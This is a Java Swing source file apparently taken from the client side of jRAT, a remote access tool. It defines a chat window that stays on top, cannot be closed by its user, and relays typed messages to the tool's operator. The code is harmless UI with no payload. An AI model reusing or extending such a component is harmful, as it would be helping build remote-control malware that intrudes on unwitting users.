package jrat.client;

import jrat.client.packets.outgoing.Packet35ChatMessage;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;


@SuppressWarnings("serial")
public class FrameChat extends JFrame {

	private Connection con;
	private JPanel contentPane;
	public JTextPane txtChat;
	private JTextField textField;
	private JButton btnSend;
	
	public void nudge() {
		new Nudge(this).start();
	}

	public FrameChat(Connection con) {
		this.con = con;
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (Exception e1) {
			e1.printStackTrace();
		}
		setAlwaysOnTop(true);
		setResizable(false);
		setTitle("Chat");
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		setBounds(100, 100, 400, 307);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JScrollPane scrollPane = new JScrollPane();

		textField = new JTextField();
		textField.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent arg0) {
				if (arg0.getKeyCode() == KeyEvent.VK_ENTER) {
					send();
				}
			}
		});
		textField.setColumns(10);

		btnSend = new JButton("Send");
		btnSend.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				send();
			}
		});
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 383, GroupLayout.PREFERRED_SIZE).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addComponent(textField, GroupLayout.DEFAULT_SIZE, 278, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(btnSend, GroupLayout.PREFERRED_SIZE, 96, GroupLayout.PREFERRED_SIZE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 241, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnSend))));

		txtChat = new JTextPane();
		scrollPane.setViewportView(txtChat);
		contentPane.setLayout(gl_contentPane);
		pack();
	}

	public void send() {
		try {
			if (textField.getText().trim().length() > 0) {
				StyleContext sc = StyleContext.getDefaultStyleContext();
				AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.blue);
				con.addToSendQueue(new Packet35ChatMessage(textField.getText().trim()));
				txtChat.getDocument().insertString(txtChat.getDocument().getLength(), "You: " + textField.getText().trim() + "\n", set);
				textField.setText("");
				txtChat.setSelectionEnd(con.getFrameChat().txtChat.getText().length());
				txtChat.setSelectionStart(con.getFrameChat().txtChat.getText().length());
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
